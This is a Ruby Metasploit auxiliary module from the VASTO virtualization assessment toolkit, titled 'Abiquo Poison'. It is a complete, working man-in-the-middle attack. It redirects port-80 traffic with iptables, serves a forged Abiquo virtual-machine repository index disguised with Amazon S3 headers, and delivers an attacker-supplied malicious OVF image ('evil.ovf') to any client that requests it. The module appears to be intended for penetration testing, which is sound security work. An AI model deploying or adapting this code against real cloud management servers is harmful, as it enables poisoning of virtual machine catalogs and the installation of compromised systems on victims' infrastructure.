#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::TcpServer
	include Msf::Auxiliary::Report
	include Rex::FileUtils
	
	def initialize
		super(
			'Name'        => 'Abiquo Poison',
			'Version'     => 'Abiquo Poison 0.1',
			'Description'    => %q{
			"This module will assume a MITM attack is in place
			against the remote Abiquo server.
			The module will poison the virtual machine database section of the interface,
			presenting fake virtual machines. This module requres root privileges to run."
			},
			'Author'      => ['Claudio Criscione'],
			'License'     => GPL_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
				OptString.new('LVM',    [ true, "Full path to the fake virtual machine.", "/tmp/evilmachine.ovf" ]),
			], self.class)
	end

	def run
		@evilvm   = datastore['LVM']
		#In order to test the module on a virtual machine running Abiquo, you can use
		system("iptables -t nat -A OUTPUT -p tcp --destination-port 80 -j DNAT --to 127.0.0.1")
		exploit()
	end
	
	
	def on_client_connect(c)
		c.extend(Rex::Proto::Http::ServerClient)
		c.init_cli(self)
	end
	
	def on_client_data(cli)
		begin
			data = cli.get_once(-1, 5)
			raise ::Errno::ECONNABORTED if !data or data.length == 0
			case cli.request.parse(data)
				when Rex::Proto::Http::Packet::ParseCode::Completed
					dispatch_request(cli, cli.request)
					cli.reset_cli
				when  Rex::Proto::Http::Packet::ParseCode::Error
					close_client(cli)
			end
		rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
		rescue ::OpenSSL::SSL::SSLError
		rescue ::Exception
			print_status("AbiquoPoison - Error: #{$!.class} #{$!} #{$!.backtrace}")
		end
	
		close_client(cli)
	end

	def close_client(cli)
		cli.close
		# Require to clean up the service properly
		raise ::EOFError
	end
	
	def dispatch_request(cli, req)
		print_status("AbiquoPoison - Client #{cli.peerhost} connected and asked #{req.resource}")
		phost = cli.peerhost
		mysrc = Rex::Socket.source_address(cli.peerhost)
		hhead = (req['Host'] || @myhost).split(':', 2)[0]
		if (req.resource =~ /^http\:\/+([^\/]+)(\/*.*)/)
			req.resource = $2
			hhead, nport = $1.split(":", 2)[0]
			@myport = nport || 80
		end
		
		#Poisoning the list of available virtual machines
		if(req.resource == "/ovfindex.xml")
			print_status("AbiquoPoison - Poisoning list of Abiquo server IP #{cli.peerhost}")
			
			#Sending data
			data = <<-eos
<?xml version='1.0' encoding='UTF-8'?>
<ns3:RepositorySpace
	xmlns:ns6="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_ResourceAllocationSettingData"
	xmlns:ns5="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_VirtualSystemSettingData"
	xmlns:ns4="http://schemas.dmtf.org/wbem/wscim/1/common" xmlns:ns3="http://www.abiquo.com/appliancemanager/repositoryspace"
	xmlns:ns2="http://schemas.dmtf.org/ovf/envelope/1" ns3:RepositoryURI="http://abispace.s3.amazonaws.com" ns3:RepositoryName="abiSpace">
	<ns3:OVFDescription ns3:DiskFormat="STREAM_OPTIMIZED"
		ns3:OVFFile="evil.ovf" ns3:OVFCategories="OS,VirtualBox" ns2:instance="" ns2:class="">
		<ns2:Info>This is the perfect machine, suitable for any kind of event. </ns2:Info>
		<ns2:Product>Ubuntu Linux 9.04 32 bits</ns2:Product>
       	<ns2:Icon ns2:fileRef="http://abispace.s3.amazonaws.com/ubuntu_logo.png" ns2:mimeType="image/jpeg" ns2:width="32" ns2:height="32"/>
	</ns3:OVFDescription>
	<ns3:OVFDescription ns3:DiskFormat="KVM" ns3:OVFCategories="OS,KVM"
		ns3:OVFFile="evil.ovf" ns2:instance="" ns2:class="">
		<ns2:Info>openSUSE is a general purpose operating system built on top of the Linux kernel, developed by the community-supported openSUSE Project and sponsored by Novell. 'root' password is 'linux'.</ns2:Info>
		<ns2:Product>openSUSE 11.1 i686</ns2:Product>
       	<ns2:Icon ns2:fileRef="http://abispace.s3.amazonaws.com/opensuse_logo.png" ns2:mimeType="image/jpeg" ns2:width="32" ns2:height="32"/>
	</ns3:OVFDescription>
	<ns3:OVFDescription ns3:DiskFormat="VMWARE" 
		ns3:OVFFile="evil.ovf" ns3:OVFCategories="OS,VMware" ns2:instance="" ns2:class="">
		<ns2:Info>openSUSE is a general purpose operating system built on top of the Linux kernel, developed by the community-supported openSUSE Project and sponsored by Novell. 'root' password is 'linux'.</ns2:Info>
		<ns2:Product>openSUSE 11.1 i686</ns2:Product>
       	<ns2:Icon ns2:fileRef="http://abispace.s3.amazonaws.com/opensuse_logo.png" ns2:mimeType="image/jpeg" ns2:width="32" ns2:height="32"/>
	</ns3:OVFDescription>
	<ns3:OVFDescription ns3:DiskFormat="VBOX" ns3:OVFCategories="Firewalls,VirtualBox" 
		ns3:OVFFile="evil.ovf" ns2:instance=""
		ns2:class="">
		<ns2:Info>Enterprise Class Virtual Security Gateway</ns2:Info>
		<ns2:Product>Clavister Core Plus</ns2:Product>
       	<ns2:Icon ns2:fileRef="http://abispace.s3.amazonaws.com/clavister_logo.png" ns2:mimeType="image/jpeg" ns2:width="32" ns2:height="32"/>
	</ns3:OVFDescription>
	<ns3:OVFDescription ns3:DiskFormat="STREAM_OPTIMIZED" 
		ns3:OVFFile="evil.ovf" ns3:OVFCategories="Firewalls,Networking" ns2:instance="" ns2:class="">
		<ns2:Info>Vyatta is revolutionizing the networking industry by delivering a software-based, open-source, network operating system that is portable to standard x86 hardware as well as common virtualization and cloud computing platforms.</ns2:Info>
		<ns2:Product>Vyatta Virtual Router</ns2:Product>
       	<ns2:Icon ns2:fileRef="http://www.vyatta.com/images/common/vyatta_logo.gif" ns2:mimeType="image/jpeg" ns2:width="32" ns2:height="32"/>
	</ns3:OVFDescription>
</ns3:RepositorySpace>
			eos
			
			header = <<-eos
HTTP/1.1 200 OK
x-amz-id-2: wmsLEq3x9ye2LtjRdCYXR5WMtZSFUGE+PvUeCSp/oSWf4kl6KuPOM+BZ/ki3ZX/p
x-amz-request-id: 2A177C722B71D76B
Date: Sun, 13 Jun 2010 17:48:52 GMT
Last-Modified: Wed, 05 May 2010 15:57:18 GMT
ETag: "34c63eb57b22262d93c6e05a65124849"
Content-Type: text/xml
eos
			header = header + "Content-Length: #{data.length}\r\n" +	"Server: AmazonS3\r\n\r\n"
			cli.put(header+data)
			return
		end
		if(req.resource == "evil.ovf")
		#Send the malicious virtual machine
		
			print_status("AbiquoPoison - Bingo #{cli.peerhost} is asking for the fake virtual machine. Infecting.")
			print_status("#{cli.peerhost} uploading virtual machine")
			data = File.read("#{@evilvm}")
			res  = 
				"HTTP/1.1 200 Ok\r\n" +
				"Host: #{mysrc}\r\n" +
				"Content-Type: binary/octet-string\r\n" +
				"Content-Length: #{data.length}\r\n" +
				"Connection: Close\r\n\r\n#{data}"
			cli.put(res)
			return
		end	
	end
end
